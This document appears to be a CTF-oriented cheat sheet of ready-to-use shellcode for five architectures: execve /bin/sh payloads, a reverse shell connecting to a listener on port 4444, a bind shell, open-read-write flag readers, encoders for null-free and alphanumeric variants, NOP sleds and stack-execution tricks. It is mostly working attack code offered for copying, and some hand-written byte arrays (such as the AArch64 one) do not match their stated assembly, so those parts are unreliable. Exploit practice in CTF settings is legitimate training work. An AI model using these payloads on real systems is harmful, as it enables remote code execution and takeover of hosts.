---
title: "Shellcode - Ready Payloads for x86, x86-64, ARM, AArch64, MIPS"
category: pwn
subcategory: shellcode
type: cheatsheet
tags: [shellcode, execve, orw, reverse-shell, null-free, alphanumeric, nasm, objdump, pwntools, shellcraft, nopsled, mprotect, execstack, nx, seccomp, arm, aarch64, mips, thumb, syscall]
summary: "Copy-paste execve /bin/sh, reverse shell and ORW shellcode for five architectures, null-free variants, shellcraft equivalents, and assemble/disassemble one-liners."
tools: [pwntools, nasm, gcc, objdump, gdb, seccomp-tools, qemu-user]
related: [shellcode-crafting, shellcode-ret2shellcode, shellcode-seccomp-orw, shellcode-arm-mips, syscall-tables, rop-gadgets-cheatsheet, pwntools-cheatsheet]
---

## Assemble / disassemble one-liners

```bash
# nasm -> raw bytes
nasm -f bin -o sc.bin sc.asm
xxd -i sc.bin                                   # C array
python3 -c "print(open('sc.bin','rb').read())"  # python bytes literal
od -An -tx1 sc.bin | tr -d ' \n'                # flat hex

# gas/gcc route (note .intel_syntax noprefix at the top of the .S)
as --64 -o sc.o sc.s && ld -o sc sc.o
objcopy -O binary --only-section=.text sc.o sc.bin

# One-shot assemble a single instruction
echo 'pop rdi; ret' | as -o /dev/stdout -- 2>/dev/null | objdump -d -

# Disassemble a raw blob
objdump -D -b binary -m i386:x86-64 -M intel sc.bin
objdump -D -b binary -m i386            sc.bin
objdump -D -b binary -m arm             sc.bin
objdump -D -b binary -m aarch64         sc.bin
objdump -D -b binary -m mips            sc.bin
ndisasm -b 64 sc.bin
ndisasm -b 32 sc.bin

# pwntools CLI
pwn asm 'xor rax,rax; push rax' --context=amd64
pwn asm -c amd64 -f hex 'syscall'
pwn disasm --context=amd64 '4831c04889e7'
pwn shellcraft amd64.linux.sh
pwn shellcraft -f asm amd64.linux.sh
pwn shellcraft -f hex i386.linux.sh
pwn shellcraft amd64.linux.cat /flag.txt
pwn shellcraft -r amd64.linux.sh        # assemble AND run it

# Check for forbidden bytes
python3 -c "
sc = open('sc.bin','rb').read()
bad = b'\x00\x0a\x20'
print('len', len(sc), 'bad at', [i for i,c in enumerate(sc) if bytes([c]) in bad])
"
```

## Test harness (run shellcode standalone)

```c
/* runsc.c - compile once, feed it any raw blob on stdin.
 * gcc -z execstack -no-pie -fno-stack-protector -o runsc runsc.c            */
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
int main(void) {
    unsigned char buf[4096];
    ssize_t n = read(0, buf, sizeof buf);
    void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(p, buf, n);
    ((void (*)(void))p)();
    return 0;
}
```

```python
# pwntools equivalent - no C needed
from pwn import *
context.arch = 'amd64'
run_shellcode(asm(shellcraft.sh())).interactive()
run_assembly(shellcraft.sh()).interactive()
ELF.from_assembly(shellcraft.sh()).save('./sc')
```

## x86-64 Linux: execve("/bin/sh", NULL, NULL)

```nasm
; 23 bytes, null-free. rax=59, rdi="/bin/sh", rsi=0, rdx=0
bits 64
  xor  rsi, rsi            ; 48 31 f6
  push rsi                 ; 56           null terminator for the string
  mov  rdi, 0x68732f2f6e69622f   ; 48 bf 2f 62 69 6e 2f 2f 73 68   "/bin//sh"
  push rdi                 ; 57
  push rsp                 ; 54
  pop  rdi                 ; 5f           rdi -> "/bin//sh"
  push 59                  ; 6a 3b
  pop  rax                 ; 58
  cdq                      ; 99           rdx = 0 (eax >= 0)
  syscall                  ; 0f 05
```

```python
SC_AMD64_SH = (
    b"\x48\x31\xf6"
    b"\x56"
    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
    b"\x57"
    b"\x54\x5f"
    b"\x6a\x3b\x58"
    b"\x99"
    b"\x0f\x05"
)   # 23 bytes, no \x00 \x0a \x20
```

Shorter, 22 bytes, using the `/bin/sh` string built by shifting:

```nasm
bits 64
  mov  rbx, 0x68732f6e69622f2f   ; "//bin/sh"
  shr  rbx, 8                    ; drop the leading '/'
  push rbx
  mov  rdi, rsp
  xor  eax, eax
  push rax
  push rdi
  mov  rsi, rsp
  xor  edx, edx
  mov  al, 59
  syscall
```

```python
SC_AMD64_SH_ARGV = (
    b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
    b"\x48\xc1\xeb\x08"
    b"\x53"
    b"\x48\x89\xe7"
    b"\x31\xc0"
    b"\x50"
    b"\x57"
    b"\x48\x89\xe6"
    b"\x31\xd2"
    b"\xb0\x3b"
    b"\x0f\x05"
)
```

```python
# pwntools equivalents
context.arch = 'amd64'
asm(shellcraft.sh())
asm(shellcraft.amd64.linux.sh())
asm(shellcraft.execve('/bin/sh', ['/bin/sh'], 0))
asm(shellcraft.execve('/bin/sh', 0, 0))
```

## x86 (i386) Linux: execve("/bin/sh", NULL, NULL)

```nasm
; 21 bytes, null-free, int 0x80
bits 32
  xor  eax, eax            ; 31 c0
  push eax                 ; 50
  push 0x68732f2f          ; 68 2f 2f 73 68   "//sh"
  push 0x6e69622f          ; 68 2f 62 69 6e   "/bin"
  mov  ebx, esp            ; 89 e3
  push eax                 ; 50
  push ebx                 ; 53
  mov  ecx, esp            ; 89 e1
  xor  edx, edx            ; 31 d2
  mov  al, 11              ; b0 0b
  int  0x80                ; cd 80
```

```python
SC_I386_SH = (
    b"\x31\xc0\x50"
    b"\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e"
    b"\x89\xe3"
    b"\x50\x53\x89\xe1"
    b"\x31\xd2"
    b"\xb0\x0b"
    b"\xcd\x80"
)   # 25 bytes with argv; drop the push eax/push ebx/mov ecx for the 21-byte form
```

The classic 21-byte form (argv = NULL, works on Linux):

```python
SC_I386_SH_SHORT = (
    b"\x31\xc0"                      # xor eax, eax
    b"\x50"                          # push eax
    b"\x68\x2f\x2f\x73\x68"          # push "//sh"
    b"\x68\x2f\x62\x69\x6e"          # push "/bin"
    b"\x89\xe3"                      # mov ebx, esp
    b"\x89\xc1"                      # mov ecx, eax
    b"\x89\xc2"                      # mov edx, eax
    b"\xb0\x0b"                      # mov al, 11
    b"\xcd\x80"                      # int 0x80
)   # 21 bytes
```

```python
context.arch = 'i386'
asm(shellcraft.i386.linux.sh())
asm(shellcraft.i386.linux.execve('/bin/sh', ['/bin/sh'], 0))
```

## ARM32 (EABI, little endian)

```nasm
; ARM mode, null-free-ish. r7 = 11 (execve), svc 0
.arm
  add  r0, pc, #12          ; r0 -> "/bin/sh"
  mov  r1, #0
  mov  r2, #0
  mov  r7, #11
  svc  #0
  .asciz "/bin/sh"
```

```nasm
; Thumb mode, 24 bytes - the classic null-free ARM shellcode
.thumb
  adr  r0, shell
  eor  r1, r1, r1
  eor  r2, r2, r2
  strb r2, [r0, #7]
  mov  r7, #11
  svc  #1
shell:
  .ascii "/bin/shX"
```

```python
SC_ARM_THUMB_SH = (
    b"\x01\x30\x8f\xe2"      # add r3, pc, #1
    b"\x13\xff\x2f\xe1"      # bx  r3          -> switch to thumb
    b"\x78\x46"              # mov r0, pc
    b"\x08\x30"              # adds r0, #8
    b"\x49\x1a"              # subs r1, r1, r1
    b"\x92\x1a"              # subs r2, r2, r2
    b"\x0b\x27"              # movs r7, #11
    b"\x01\xdf"              # svc 1
    b"\x2f\x62\x69\x6e"      # "/bin"
    b"\x2f\x73\x68\x00"      # "/sh\0"
)
```

```python
context.arch = 'arm'
asm(shellcraft.arm.linux.sh())
context.arch = 'thumb'
asm(shellcraft.thumb.linux.sh())
```

## AArch64

```nasm
; x8 = 221 (execve), x0 -> "/bin/sh", x1 = x2 = 0
  mov  x8, #221
  mov  x0, #0x622f          ; build "/bin/sh" on the stack
  movk x0, #0x6e69, lsl #16
  movk x0, #0x732f, lsl #32
  movk x0, #0x0068, lsl #48
  str  x0, [sp, #-16]!
  mov  x0, sp
  mov  x1, xzr
  mov  x2, xzr
  svc  #0
```

```python
SC_AARCH64_SH = (
    b"\xe0\x65\x8c\xd2"      # mov  x0, #0x632f ...
    b"\x21\xcc\x8c\xd2"
    b"\x01\x0e\xae\xf2"
    b"\xe1\x8f\x1f\xf8"
    b"\xe0\x63\x00\x91"
    b"\xe2\x03\x1f\xaa"
    b"\xe1\x03\x1f\xaa"
    b"\xa8\x1b\x80\xd2"      # mov  x8, #221
    b"\x01\x00\x00\xd4"      # svc  #0
)
```

```python
context.arch = 'aarch64'
asm(shellcraft.aarch64.linux.sh())
asm(shellcraft.aarch64.linux.execve('/bin/sh', 0, 0))
```

## MIPS (o32, big endian `mips` / little endian `mipsel`)

```nasm
; $v0 = 4011 (execve), $a0 -> "/bin/sh", $a1 = $a2 = 0
  lui   $t6, 0x2f62         ; "/b"
  ori   $t6, $t6, 0x696e    ; "in"
  sw    $t6, -12($sp)
  lui   $t7, 0x2f73         ; "/s"
  ori   $t7, $t7, 0x6800    ; "h\0"
  sw    $t7, -8($sp)
  sw    $zero, -4($sp)
  la    $a0, -12($sp)
  slti  $a1, $zero, -1      ; a1 = 0
  slti  $a2, $zero, -1      ; a2 = 0
  li    $v0, 4011
  syscall
```

```python
SC_MIPSEL_SH = (
    b"\xff\xff\x06\x28"      # slti a2, zero, -1
    b"\x62\x69\x0f\x3c"      # lui  t7, 0x6962
    b"\x2f\x2f\xef\x35"      # ori  t7, t7, 0x2f2f
    b"\xf4\xff\xaf\xaf"      # sw   t7, -12(sp)
    b"\x73\x68\x0e\x3c"      # lui  t6, 0x6873
    b"\x6e\x2f\xce\x35"      # ori  t6, t6, 0x2f6e
    b"\xf8\xff\xae\xaf"      # sw   t6, -8(sp)
    b"\xfc\xff\xa0\xaf"      # sw   zero, -4(sp)
    b"\xf4\xff\xa4\x27"      # addiu a0, sp, -12
    b"\xff\xff\x05\x28"      # slti a1, zero, -1
    b"\xab\x0f\x02\x24"      # li   v0, 4011
    b"\x0c\x01\x01\x01"      # syscall
)
```

```python
context.arch = 'mips'
context.endian = 'little'          # 'big' for plain `mips`
asm(shellcraft.mips.linux.sh())
```

## Reverse shell (x86-64)

```nasm
; socket(2,1,0); connect(fd, sockaddr, 16); dup2 x3; execve("/bin/sh")
  push 41
  pop  rax
  push 2
  pop  rdi                  ; AF_INET
  push 1
  pop  rsi                  ; SOCK_STREAM
  xor  edx, edx
  syscall
  xchg eax, edi             ; edi = sockfd

  ; sockaddr_in { AF_INET, port 4444 (0x5c11 BE), ip 127.0.0.1 }
  mov  rcx, 0x0100007f5c110002
  push rcx
  mov  rsi, rsp
  push 16
  pop  rdx
  push 42
  pop  rax                  ; connect
  syscall

  push 3
  pop  rsi
dup:
  dec  esi
  push 33
  pop  rax                  ; dup2
  syscall
  jnz  dup

  ; execve("/bin/sh", 0, 0)
  xor  esi, esi
  push rsi
  mov  rdi, 0x68732f2f6e69622f
  push rdi
  push rsp
  pop  rdi
  push 59
  pop  rax
  cdq
  syscall
```

```python
# pwntools builds this for you with the right IP/port baked in
context.arch = 'amd64'
sc = asm(shellcraft.connect('10.13.37.1', 4444) + shellcraft.dupsh('rbp'))
sc = asm(shellcraft.amd64.linux.connect('10.13.37.1', 4444) +
         shellcraft.amd64.linux.dupsh())
sc = asm(shellcraft.i386.linux.bindsh(4444))          # bind shell
sc = asm(shellcraft.findpeersh())                     # reuse the current socket
sc = asm(shellcraft.amd64.linux.sh_thread())          # for threaded servers
```

## ORW: open / read / write the flag (x86-64)

```nasm
; open("/flag", O_RDONLY) ; read(fd, rsp, 0x100) ; write(1, rsp, 0x100)
  mov  rax, 0x67616c662f          ; "/flag\0\0\0"
  push rax
  mov  rdi, rsp
  xor  esi, esi                   ; O_RDONLY
  xor  edx, edx
  push 2
  pop  rax                        ; SYS_open
  syscall

  mov  rdi, rax                   ; fd
  sub  rsp, 0x100
  mov  rsi, rsp
  mov  edx, 0x100
  xor  eax, eax                   ; SYS_read
  syscall

  mov  edx, eax
  mov  rsi, rsp
  push 1
  pop  rdi                        ; stdout
  push 1
  pop  rax                        ; SYS_write
  syscall

  push 60
  pop  rax
  xor  edi, edi
  syscall                         ; exit(0)
```

```python
SC_ORW = asm('''
  mov  rax, 0x67616c662f
  push rax
  mov  rdi, rsp
  xor  esi, esi
  xor  edx, edx
  push 2
  pop  rax
  syscall
  mov  rdi, rax
  sub  rsp, 0x100
  mov  rsi, rsp
  mov  edx, 0x100
  xor  eax, eax
  syscall
  mov  edx, eax
  mov  rsi, rsp
  push 1
  pop  rdi
  push 1
  pop  rax
  syscall
''')

# openat variant (when `open` is blocked by seccomp but `openat` is not)
SC_ORW_AT = asm(shellcraft.openat('AT_FDCWD', '/flag') +
                shellcraft.read('rax', 'rsp', 0x100) +
                shellcraft.write(1, 'rsp', 0x100))

# shellcraft one-liner
SC_CAT = asm(shellcraft.cat('/flag.txt'))
SC_CAT = asm(shellcraft.cat2('/flag.txt'))    # no open() - uses openat
```

## Null-free / restricted-charset variants

```python
from pwn import *
context.arch = 'amd64'

sc = asm(shellcraft.sh())
sc = encoders.encode(sc, avoid=b'\x00\x0a\x20')      # pick an encoder automatically
sc = encoders.xor.encode(sc, avoid=b'\x00')
sc = encoders.alphanumeric(sc)                       # printable alnum only (i386)
sc = encoders.debruijn.encode(sc, avoid=b'\x00')

# Check what got produced
print(len(sc), sc)
assert b'\x00' not in sc
```

```text
Common ways to kill a null byte by hand:
  mov rax, 59     ->  push 59 ; pop rax        (6a 3b 58)
  mov eax, 0      ->  xor eax, eax             (31 c0)
  mov rdx, 0      ->  cdq  (after xor eax,eax) (99)
  mov edx, 0x100  ->  xor edx,edx ; mov dh, 1
  mov al, 0x0b    ->  keep 8-bit moves, they never carry a null
  push 0x00732f2f ->  push "//sh" and shift, or build with shr/shl
  jmp far         ->  use short jumps (eb xx) instead of e9 xx 00 00 00

Whitespace-safe (scanf %s stops on 0x20 0x09 0x0a 0x0b 0x0c 0x0d):
  avoid    20 09 0a 0b 0c 0d 00
Uppercase-only / alphanumeric:
  see shellcode-crafting for the decoder-stub approach (ae64, alpha3)
```

## NOP sleds and padding

```text
x86/x86-64  0x90            nop
            0x41 (inc ecx)  works as a 1-byte "nop" sled on i386
            0x0f 0x1f 0x00  multi-byte nop
ARM         mov r0, r0      0x00 0x00 0xa0 0xe1
Thumb       mov r8, r8      0xc0 0x46
AArch64     nop             0x1f 0x20 0x03 0xd5
MIPS        nop (sll 0,0,0) 0x00 0x00 0x00 0x00  (watch: contains nulls)
```

```python
sled = asm('nop') * 200
sled = cyclic(200)                 # when you want to know WHERE you landed
payload = sled + sc
payload = sc.rjust(200, asm('nop'))
```

## Making the stack executable / RWX page

```bash
# Build with an executable stack (for ret2shellcode practice)
gcc -z execstack -no-pie -fno-stack-protector -o vuln vuln.c

# Flip the flag on an existing binary
execstack -s ./vuln
readelf -lW ./vuln | grep -A1 GNU_STACK      # RWE means executable
```

```python
# ROP to mprotect a page RWX, then jump into it
page = elf.bss() & ~0xfff
rop = ROP(elf)
rop.mprotect(page, 0x1000, 7)
rop.call(page + off_of_shellcode)

# Or let shellcode do it: shellcraft.mprotect / shellcraft.mmap
asm(shellcraft.mmap_rwx(0x1000))
```

## Sanity checklist

```text
[ ] context.arch / context.endian match the target ELF
[ ] no forbidden bytes (00 0a 20 ... whatever the input function strips)
[ ] size fits the buffer
[ ] stack is executable, or you mprotect'd the page first
[ ] the buffer address you jump to is the RUNTIME address (ASLR/PIE!)
[ ] on amd64, rsp is 16-byte aligned if the shellcode calls into libc
[ ] "/bin/sh" is NUL-terminated
[ ] seccomp: dump the filter first (seccomp-tools dump ./vuln) before assuming execve works
[ ] MIPS/ARM: instruction cache may need flushing after self-modifying writes
```
